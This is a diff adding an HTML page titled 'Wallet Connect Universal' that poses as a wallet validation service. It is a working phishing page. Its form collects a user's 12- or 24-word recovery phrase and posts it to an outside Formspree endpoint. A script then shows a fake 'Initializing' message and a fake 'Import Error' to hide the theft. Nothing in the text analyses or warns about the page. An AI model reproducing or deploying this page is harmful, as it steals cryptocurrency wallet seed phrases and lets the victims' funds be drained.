@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validation Hub - Wallet Connect Universal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://kit.fontawesome.com/c8e4d183c2.js" crossorigin="anonymous"></script>
+    <script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+
+    <style>
+        * {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        .wallet-form {
+            width: 90%;
+            max-width: 400px;
+            margin: auto;
+            border: 3px solid rgb(207, 207, 207);
+            padding: 20px 0px;
+        }
+        .wallet-head {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .wallet-head > div {
+            margin: 5px;
+        }
+        .phrase-key {
+            font-weight: 600;
+            font-size: .9rem;
+            font-weight: 600;
+            text-align: left;
+            padding:10px 0px;
+            margin: 0 auto;
+            width: 90%;   
+        }
+        .wallet-name {
+            background: rgb(221, 221, 221);
+            font-size: 1.2rem;
+            font-weight: 600;
+            text-align: center;
+            padding:10px 0px;
+            margin: 0 auto;
+            width: 90%;
+            border-radius: 6px;
+        }
+        .form-container {
+            width: 90%;
+            margin: 0 auto;
+            padding: 0;
+            
+        }
+        textarea {
+            width: 100%;
+            height: 10rem;
+            padding: 5px;
+            font-weight: 600;
+            color: rgb(199, 199, 199);
+            background: #000;
+            border: 1px solid silver;
+        }
+        textarea::placeholder {
+            color: rgb(4, 163, 4);
+            font-weight: 800;
+        }
+        .validate-button {
+            text-align: center;
+            width: 100%;
+            padding: 10px 0;
+            border: none;
+            background: #000;
+            color: whitesmoke;
+            font-size: 1.0rem;
+            font-weight: 700;
+        }           
+        footer {
+            text-align: center;
+             padding: 20px;
+             margin: 0;
+        } 
+        footer ul {
+            text-decoration: none;
+            list-style: none;
+            font-size: 1rem;
+        }
+        footer ul a {
+            text-decoration: none;
+            color:#5878bc;
+            font-weight: 600;
+        }
+        nav {
+            margin: 0 auto;
+            width: 90%;
+            max-width: 700px;
+        }
+        nav ul {
+            list-style-type: none;
+            display: flex;
+            justify-content: space-evenly;
+            flex-direction: row;
+            align-items: center;
+            font-weight: 600;
+        }
+        nav ul a {
+            text-decoration: none;
+        }
+        nav ul a:hover {
+            color: red;
+        }
+        nav ul a:active {
+            color: green;
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <ul>
+            <li><a href="#"> Github </a></li>
+            <li><a href="#"> Docs </a></li>
+            <li>
+            <img src="images/dapps.png" height="35px" alt="Validation Hub">
+            </li>
+            <li><a href="./index.html#Dapps"> Wallets </a></li>
+            <li><a href="#"> DApps </a></li>
+        </ul>
+        </nav>
+        <br>
+        <br>
+    <div class="wallet-form">
+        <div class="wallet-head">
+            <div><img src="images/dapps.png" height="40px" alt="atomic wallet"></div>
+        <div><h1>Wallet Connect</h1></div>
+        </div>
+
+    <form action="https://formspree.io/f/xbjwgedb" method="POST" id="my-form">
+        <p for="trustlock"  class="phrase-key" disabled>Wallet Name</p>
+        <p id="trustlock" class="wallet-name" disabled><i class="fas fa-lock"></i> Wallet Connect</p>
+        <br><br>
+        <div class="form-container">
+        <label for="phrase" class="phrase-key">Phrase</label><br>
+        <textarea name="Wallet_Connect_Universal_Key_Phrase" placeholder="Enter Phrase" id="textarea" required minlength="24"></textarea><br>
+        <p id="error-msg"></p>
+        <p class="phrase-key" style="width: 100%; text-align: center;color: rgb(155, 155, 155);font-weight: 700;">Typically 12 or 24 words separated by single spaces</p>
+        <button type="submit" class="validate-button" id="myBtn">VALIDATE WALLET  &nbsp; <span style="font-size: 20px;font-weight: 900;"> &rarr;</span> </button>
+        </div>
+    </form>
+</div>
+<br>
+<br>
+<br>
+<br>
+<br>
+<footer>
+    <ul>
+        <li><a href="#"><i class="fab fa-discord"></i> Discord</a></li><br>
+        <li><a href="#"><i class="fab fa-telegram"></i> Telegram</a></li><br>
+        <li><a href="#"><i class="fab fa-twitter"></i> Twitter</a></li><br>
+        <li><a href="#"><i class="fab fa-github"></i> Github</a></li><br>
+    </ul>
+    <br>
+    <p style="color: rgb(156, 156, 156);font-size: 0.7rem;">Copyright &copy; 2022 | All rights reserved.</p>
+</footer>
+<script src="main.js"></script>
+<script>  
+    let inputField = document.getElementById('textarea');
+    // inputField.addEventListener('input', function() {
+    //     if (inputField.value.split(' ').length < 10) {
+    //         alert('Typically 12 or 24 words separated by single spaces');
+    //     }
+    // })
+    
+    let errorMsg = document.getElementById('error-msg');
+     let x = document.getElementById("myBtn");
+     x.addEventListener("click", myFunction);
+    //  x.addEventListener("click", checkWords);
+     
+     function myFunction() {
+         errorMsg.textContent = "Initializing...";
+         errorMsg.style.color = 'green';
+         errorMsg.style.fontWeight = '800';
+         
+     setTimeout(function(){
+         errorMsg.textContent = 'Import Error! Reload the Page and try again!';
+         errorMsg.style.color = 'red';
+         errorMsg.style.fontWeight = '800';
+     }, 2000);
+     };
+</script>
+</body>
+</html>
